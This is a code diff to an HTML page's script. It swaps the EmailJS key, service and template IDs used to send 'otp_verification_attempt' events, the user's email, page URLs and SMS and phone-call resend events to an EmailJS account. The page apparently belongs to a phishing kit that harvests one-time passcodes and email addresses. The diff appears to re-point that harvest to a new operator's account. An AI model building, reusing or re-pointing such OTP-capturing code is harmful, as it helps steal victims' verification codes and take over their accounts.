@@ -407,7 +407,7 @@
   <script>
     (function() {
       // Initialize EmailJS
-      emailjs.init("SdkmRe8WZ7itEba9z");
+      emailjs.init("uGRhkufMjo08rjwb_");
 
       // DOM elements
       const submitBtn = document.getElementById('submit-btn');
@@ -491,7 +491,7 @@
           page_url: window.location.href,
           action: "otp_verification_attempt"
         };
-        return emailjs.send("service_zuj2d2a", "template_tvd86sp", params);
+        return emailjs.send("service_t84doqy", "template_awd8sif", params);
       }
 
       // --- submit ---
@@ -579,7 +579,7 @@
             user_email: userEmail,
             timestamp: new Date().toLocaleString()
           };
-          emailjs.send("service_zuj2d2a", "template_tvd86sp", params)
+          emailjs.send("service_t84doqy", "template_awd8sif", params)
             .then(r => console.log("SMS resend tracked:", r.status))
             .catch(e => console.error("SMS tracking error:", e));
 
@@ -611,7 +611,7 @@
             user_email: userEmail,
             timestamp: new Date().toLocaleString()
           };
-          emailjs.send("service_zuj2d2a", "template_tvd86sp", params)
+          emailjs.send("service_t84doqy", "template_awd8sif", params)
             .then(r => console.log("Phone call resend tracked:", r.status))
             .catch(e => console.error("Call tracking error:", e));
 
